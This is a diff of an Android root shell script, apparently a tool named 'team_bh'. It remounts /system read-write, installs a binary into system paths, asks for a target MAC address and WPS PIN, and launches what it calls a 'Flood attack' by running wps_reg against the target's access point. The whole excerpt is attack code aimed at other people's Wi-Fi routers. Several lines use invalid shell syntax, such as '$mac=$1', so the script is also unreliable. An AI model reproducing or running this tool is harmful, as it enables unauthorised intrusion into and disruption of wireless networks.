@@ -32,7 +32,6 @@ mount -o rw,remount /system
 mv team_bh /system/bin
 mv team_bh /system/xbin
 
-$int=wlan0
 #for bin
 file="/system/bin/team-bh"
 if [  -f "$file" ]
@@ -47,7 +46,6 @@ exit
 exit
 sleep 1
 fi
-$team_bh=wps
 $mac=$1
 $pin
 echo enter MAC address
@@ -61,6 +59,6 @@ sleep 1
 echo "starting Flood attack..."
 sleep 1
 
-su -c $wps IFNAME=$int wps_reg $1 $pin && su -c wps
+su -c  team_bh IFNAME=wlan0 wps_reg $1 $pin && su -c wps
 sleep 8
 break
